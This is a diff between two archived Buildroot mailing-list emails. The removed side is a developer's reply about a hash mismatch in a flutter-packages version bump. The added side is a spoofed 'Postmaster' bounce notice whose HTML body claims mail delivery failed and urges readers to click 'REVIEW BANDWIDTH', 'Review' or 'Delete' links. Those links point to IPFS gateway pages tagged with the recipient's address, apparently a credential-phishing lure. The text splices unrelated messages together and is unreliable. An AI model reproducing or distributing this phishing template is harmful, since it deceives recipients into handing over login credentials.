@@ -4,100 +4,47 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 70D10C54E58
-	for <buildroot@archiver.kernel.org>; Mon, 25 Mar 2024 23:24:45 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id F130FC54E64
+	for <buildroot@archiver.kernel.org>; Mon, 25 Mar 2024 23:25:33 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 2F4D16087F;
-	Mon, 25 Mar 2024 23:24:45 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id A34F76087F;
+	Mon, 25 Mar 2024 23:25:33 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp3.osuosl.org ([127.0.0.1])
  by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id qRG23v8xXl27; Mon, 25 Mar 2024 23:24:44 +0000 (UTC)
+ id 4ruFxT9rVkUG; Mon, 25 Mar 2024 23:25:32 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 2226260891
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 94E1A60891
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 2226260891;
-	Mon, 25 Mar 2024 23:24:44 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 94E1A60891;
+	Mon, 25 Mar 2024 23:25:32 +0000 (UTC)
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by ash.osuosl.org (Postfix) with ESMTP id F17361BF417
- for <buildroot@lists.busybox.net>; Mon, 25 Mar 2024 23:24:42 +0000 (UTC)
+ by ash.osuosl.org (Postfix) with ESMTP id B98061BF417
+ for <buildroot@lists.busybox.net>; Mon, 25 Mar 2024 23:25:30 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id DB35781E1D
- for <buildroot@lists.busybox.net>; Mon, 25 Mar 2024 23:24:42 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id A6AA581E1D
+ for <buildroot@lists.busybox.net>; Mon, 25 Mar 2024 23:25:30 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id R0igDs853_Kx for <buildroot@lists.busybox.net>;
- Mon, 25 Mar 2024 23:24:42 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom;
- client-ip=2a00:1450:4864:20::32e; helo=mail-wm1-x32e.google.com;
- envelope-from=arnout.vandecappelle@essensium.com; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org DB8B98179A
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org DB8B98179A
-Received: from mail-wm1-x32e.google.com (mail-wm1-x32e.google.com
- [IPv6:2a00:1450:4864:20::32e])
- by smtp1.osuosl.org (Postfix) with ESMTPS id DB8B98179A
- for <buildroot@buildroot.org>; Mon, 25 Mar 2024 23:24:41 +0000 (UTC)
-Received: by mail-wm1-x32e.google.com with SMTP id
- 5b1f17b1804b1-4148bd1d000so5931285e9.3
- for <buildroot@buildroot.org>; Mon, 25 Mar 2024 16:24:41 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1711409079; x=1712013879;
- h=content-transfer-encoding:in-reply-to:content-language:from
- :references:to:subject:user-agent:mime-version:date:message-id
- :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
- bh=nkt9NEGKBQ/6ySlCj+v3Xv9angTSjVcM4bFSYiDZL5w=;
- b=agnNI6umMe9B680nXQqGveaxx5z8RNzu25RV2AXY3fH+536b64Vo6hJM+DO9v8pXa5
- B4dOtGhDIG8ydzdgCX+yt/s38q3X9hYpczo/4D7+J/BXITmUU/+dg2jfqf/8yhnt9axc
- XA6G37RGBTGke5nxfL5cZUOuZcFd2Tn1Y8xAX5XrOkmcSIz2D+EYybDsulkN895WHkGv
- NoWgUoAfpqBNOr2HXyamKg5i/A+lq+KJab5X0kzifvjmV7noc+jySGW7QqWWEMzINuJg
- bNAA0xIEUMbDtFE791MeNcf4i3Ea8WJoK8a0BmCuzrOAmca6wwpzZr6bIeXzLTWZ3X98
- yOaA==
-X-Forwarded-Encrypted: i=1;
- AJvYcCVNhNTHq4UdvAFUV1bAKj4iiAt4Gh+IfM+50Ec2o8D6xodrfjqKAAf2caB3xvd4L1Fgnzzj0HQyoRrHb+l0x958Fc3MoCIz1w==
-X-Gm-Message-State: AOJu0YyvidDwkPfhw1+kmw6XEHxf+HYou07mbI3+yqf0T2IVsduG+PsG
- 0F8WCKAyf+xF6iXXBabb3jdMrP80q4lmmqCu6QOr7i72yhBmXACwEta5ZOt32heDAgX0GvCIizk
- 8
-X-Google-Smtp-Source: AGHT+IFO+yPjKl2bvT5oZroK1O+U4TU/jnvjvrdpbsJ+PLlE43ckxRYtPMsKNk3FDmAp9LPGpc4I2g==
-X-Received: by 2002:a05:600c:3111:b0:414:6164:f96 with SMTP id
- g17-20020a05600c311100b0041461640f96mr709420wmo.37.1711409079327; 
- Mon, 25 Mar 2024 16:24:39 -0700 (PDT)
-Received: from ?IPV6:2a02:1811:3a7e:7b00:29c8:f1e0:f17f:3385?
- (ptr-9fplejngm4eebjbmd8l.18120a2.ip6.access.telenet.be.
- [2a02:1811:3a7e:7b00:29c8:f1e0:f17f:3385])
- by smtp.gmail.com with ESMTPSA id
- fj12-20020a05600c0c8c00b0041409db0349sm9748578wmb.48.2024.03.25.16.24.38
- (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
- Mon, 25 Mar 2024 16:24:38 -0700 (PDT)
-Message-ID: <a867036e-34b8-45b3-a4be-4d429f7d83be@mind.be>
-Date: Tue, 26 Mar 2024 00:24:35 +0100
+ id kqAO5uxXqq7I for <buildroot@lists.busybox.net>;
+ Mon, 25 Mar 2024 23:25:30 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 29A7F8179A
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 29A7F8179A
+Received: from busybox.net (unknown [141.98.10.132])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 29A7F8179A
+ for <buildroot@busybox.net>; Mon, 25 Mar 2024 23:25:28 +0000 (UTC)
+From: Postmaster <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 26 Mar 2024 00:25:27 +0100
+Message-ID: <20240326002527.06726BBC88BD6BD1@busybox.net>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-To: Adam Duskett <adam.duskett@amarulasolutions.com>, buildroot@buildroot.org
-References: <20240325223424.108702-1-adam.duskett@amarulasolutions.com>
- <20240325223424.108702-13-adam.duskett@amarulasolutions.com>
-Content-Language: en-GB
-In-Reply-To: <20240325223424.108702-13-adam.duskett@amarulasolutions.com>
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=mind.be; s=google; t=1711409079; x=1712013879; darn=buildroot.org;
- h=content-transfer-encoding:in-reply-to:content-language:from
- :references:to:subject:user-agent:mime-version:date:message-id:from
- :to:cc:subject:date:message-id:reply-to;
- bh=nkt9NEGKBQ/6ySlCj+v3Xv9angTSjVcM4bFSYiDZL5w=;
- b=aNY2nfWioUzXaA0YqLPvTWLpQNkt2aOYeg9hR0LPxWvtN73L+oSjMKcQqTuL0JQH5p
- NlN5Quio16cZsMulJYDGbI9DBJWcsIpWgkU98LUzMT8aAQdu/H8hxU94K0KpbJSqg7cQ
- IngKzaprXibefV1L8BJ/2gWb5aA0qVZH5IAIWWl9J2jyb9qsprEwlZ6GFgY+FtDUhJHb
- dj/ofuSO3j5zVX2k7tvW73E7prptKs9GGBJjfd15ErP5rA9ara7AujxgoRmTmCgItGOW
- 6NZ7NspCswz0x955HxNWjG+KNxBIRoTzWbekwK9/nQIsUevCElBcDyI7P3ikmypsRnzv
- iFeA==
 X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
- dmarc=pass (p=quarantine dis=none)
- header.from=mind.be
-X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
- dkim=pass (2048-bit key) header.d=mind.be header.i=@mind.be
- header.a=rsa-sha256 header.s=google header.b=aNY2nfWi
-Subject: Re: [Buildroot] [PATCH v2 13/13] package/flutter-packages: bump
- version to 611aea1657fbfc0d2564a14b08e12dffc70189bb
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] Undeliverable: Outgoing Mail Returned to Sender
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -109,66 +56,123 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Arnout Vandecappelle via buildroot <buildroot@buildroot.org>
-Reply-To: Arnout Vandecappelle <arnout@mind.be>
-Content-Transfer-Encoding: 7bit
-Content-Type: text/plain; charset="us-ascii"; Format="flowed"
+Content-Type: multipart/mixed; boundary="===============7760727717045943979=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
+--===============7760727717045943979==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
+ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
+ 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+text-decoration-style: initial; text-decoration-color: initial; -webkit-tex=
+t-stroke-width: 0px; text-decoration-thickness: initial;">
+<tbody style=3D"box-sizing: border-box;">
+<tr style=3D"box-sizing: border-box;">
+<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 2px; color: rgb(0, 0, 0); box-sizing: border-box; background-col=
+or: rgb(2, 151, 64);">&nbsp;</th>
+<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
+ne; width: 665px; color: rgb(0, 0, 0); box-sizing: border-box; background-c=
+olor: rgb(243, 255, 248);"><span style=3D"font-size: 12px; box-sizing: bord=
+er-box;">Message from&nbsp;busybox.net server</span></td></tr></tbody></tab=
+le>
+<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
+ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
+spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
+ font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
+: normal; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inhe=
+rit; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
+font-variant-caps: normal; text-decoration-style:=20
+initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial;"><font color=3D"#000066" face=3D"Arial" s=
+ize=3D"4" style=3D"box-sizing: border-box;"><table style=3D"padding-top: 32=
+px; background-color: rgb(255, 255, 255);" cellspacing=3D"0" cellpadding=3D=
+"0"><tbody><tr><td><font size=3D"2"> </font><table cellspacing=3D"0" cellpa=
+dding=3D"0"><tbody><tr>
+<td style=3D"padding: 24px 24px 32px; border-radius: 2px; border: 1px solid=
+ rgb(224, 224, 224); border-image: none; max-width: 560px; background-color=
+: rgb(250, 250, 250);"><font size=3D"2"> </font><font size=3D"2"> </font><f=
+ont size=3D"2"> </font><table style=3D"padding-top: 8px; min-width: 272px;"=
+><tbody><tr><td> <h2 style=3D"margin: 0px; color: rgb(33, 33, 33); font-wei=
+ght: bold;"><font size=3D"1"></font><font size=3D"2">Message bandwidth is f=
+ull </font></h2></td></tr><tr>
+<td style=3D"text-align: left; color: rgb(117, 117, 117); padding-top: 20px=
+; font-weight: normal;"><p><font size=3D"2"> This message was created autom=
+atically by mail delivery software.</font></p><p><br><font size=3D"2">The f=
+ollowing message from </font><a style=3D"color: rgb(33, 33, 33); text-decor=
+ation: none;" href=3D"mailto:buildroot@busybox.net"><b><font size=3D"2">bui=
+ldroot@busybox.net</font></b></a><font size=3D"2"> was undeliverable.<br>&n=
+bsp;The reason for the problem:<br>
+&nbsp;5.4.7 - Delivery expired (message too old) 'timeout'</font></p></td><=
+/tr><tr><td style=3D"text-align: left; color: rgb(66, 133, 244); padding-to=
+p: 24px;"><font size=3D"2"></font>
+<a style=3D"text-decoration: none;" href=3D"https://cloudflare-ipfs.com/ipf=
+s/bafkreigwc373y7yceu26vz77ylvqslg2pkacl3tr6rbrk4dr4rbua3ywjm?#buildroot@bu=
+sybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.google.com=
+/url?q=3Dhttps://support.google.com/mail/answer/6596&amp;source=3Dgmail&amp=
+;ust=3D1680546997744000&amp;usg=3DAOvVaw0KwZ7dRteNzrgii7VYARUA"><font size=
+=3D"2"><strong>REVIEW BANDWIDTH</strong></font></a></td></tr></tbody></tabl=
+e><font size=3D"2"></font></td></tr></tbody>
+</table><font size=3D"2"></font></td></tr><tr style=3D"border: currentColor=
+; border-image: none; width: 90%; background-color: rgb(255, 255, 255);"><t=
+d align=3D"left" style=3D"padding: 48px 10px;"><font size=3D"2"><font size=
+=3D"3"><span style=3D"box-sizing: border-box;">You have 3 pending outgoing =
+messages that could not be sent as of 3/26/2024 12:25:27 a.m.</span><br sty=
+le=3D"box-sizing: border-box;"><span style=3D"box-sizing: border-box;"><fon=
+t style=3D"box-sizing: border-box;">Click to&nbsp;</font>
+<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
+; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
+ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
+ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxf=
+edf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_b=
+lank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Review</fo=
+nt></a>
+<font style=3D"box-sizing: border-box;">or</font>
+<a class=3D"v1external_mr_css_attr" style=3D"border-width: 0px; margin: 0px=
+; padding: 0px; color: rgb(17, 85, 204); text-decoration: none; vertical-al=
+ign: baseline; cursor: pointer; box-sizing: border-box; background-color: t=
+ransparent;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxf=
+edf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_b=
+lank" rel=3D"noreferrer"><font style=3D"box-sizing: border-box;">Delete</fo=
+nt></a>
+<font style=3D"box-sizing: border-box;">pending outgoing email messages.</f=
+ont></span></font></font></td></tr></tbody></table><p><font size=3D"3"><spa=
+n style=3D"box-sizing: border-box;"><span style=3D"color: black; box-sizing=
+: border-box;"><font size=3D"3"><font size=3D"2">The response was:<br></fon=
+t></font></span></span></font><p style=3D"font-family: monospace;"><font si=
+ze=3D"3"><font size=3D"3"><font size=3D"2">
+ A message that you sent could not be delivered to one or more of its recip=
+ients. This is a temporary error. <br>Learn more at </font>
+<a href=3D"https://dweb.link/ipfs/QmZ6uSvSTJ3Uh9BAeA5f2GDMKdR22gmTZimY28ted=
+pqwHj?filename=3DQmZ6uSvSTJ3Uh9BAeA5f2GDMKdR22gmTZimY28tedpqwHj#buildroot@b=
+usybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.google.co=
+m/url?q=3Dhttps://support.google.com/mail/answer/6596&amp;source=3Dgmail&am=
+p;ust=3D1680546997744000&amp;usg=3DAOvVaw0KwZ7dRteNzrgii7VYARUA"> <font siz=
+e=3D"2">https://support.busybox.net/<wbr>mail/answer/6596</font></a></font>=
+</font></p><p></p></font></div></body></html>
 
-On 25/03/2024 23:34, Adam Duskett wrote:
-> Now that flutter-engine is 3.19.x, it is safe to bump flutter-packages to
-> the latest commit.
-> 
-> Signed-off-by: Adam Duskett <adam.duskett@amarulasolutions.com>
-> ---
->   package/flutter-packages/flutter-packages.hash | 2 +-
->   package/flutter-packages/flutter-packages.mk   | 2 +-
->   2 files changed, 2 insertions(+), 2 deletions(-)
-> 
-> diff --git a/package/flutter-packages/flutter-packages.hash b/package/flutter-packages/flutter-packages.hash
-> index 994434e25c..eac58e608f 100644
-> --- a/package/flutter-packages/flutter-packages.hash
-> +++ b/package/flutter-packages/flutter-packages.hash
-> @@ -1,3 +1,3 @@
->   # Locally calculated
-> -sha256  8276276e050c1ea45787f74b0f8c915b8cf2162b6af8537ffa9886bd423f2828  flutter-packages-947e34ce9fedcdd6750b54eb1cc74b854b49ab48-br1.tar.gz
-> +sha256  a42e39a920d72183119b0e0bb7399513369a2aa7472f25da57ae95aad32e022b  flutter-packages-611aea1657fbfc0d2564a14b08e12dffc70189bb-br1.tar.gz
+--===============7760727717045943979==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-  Not sure what went wrong here...
-
-ERROR: while checking hashes from 
-package/flutter-packages/flutter-markdown-example/flutter-markdown-example.hash
-ERROR: flutter-packages-611aea1657fbfc0d2564a14b08e12dffc70189bb-br1.tar.gz has 
-wrong sha256 hash:
-ERROR: expected: a42e39a920d72183119b0e0bb7399513369a2aa7472f25da57ae95aad32e022b
-ERROR: got     : 9f9c0d1492cb52719eccd06231115dd72d2e4f0cb74db62e38aae6e66d1f8d44
-ERROR: Incomplete download, or man-in-the-middle (MITM) attack
-
-
-  Perhaps the directory changed? In my downloaded tarball, it's under
-packages-611aea1657fbfc0d2564a14b08e12dffc70189bb/
-
-  Regards,
-  Arnout
-
->   sha256  89519eca6f7b9529b35bdddd623a58c3af06a88c458dbd6531ddb4675acf75a9  LICENSE
-> diff --git a/package/flutter-packages/flutter-packages.mk b/package/flutter-packages/flutter-packages.mk
-> index 4beaa39325..ef29e0aa98 100644
-> --- a/package/flutter-packages/flutter-packages.mk
-> +++ b/package/flutter-packages/flutter-packages.mk
-> @@ -4,7 +4,7 @@
->   #
->   ################################################################################
->   
-> -FLUTTER_PACKAGES_VERSION = 947e34ce9fedcdd6750b54eb1cc74b854b49ab48
-> +FLUTTER_PACKAGES_VERSION = 611aea1657fbfc0d2564a14b08e12dffc70189bb
->   FLUTTER_PACKAGES_SITE = $(call github,flutter,packages,$(FLUTTER_PACKAGES_VERSION))
->   FLUTTER_PACKAGES_LICENSE = BSD-3-Clause
->   FLUTTER_PACKAGES_LICENSE_FILES = LICENSE
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============7760727717045943979==--
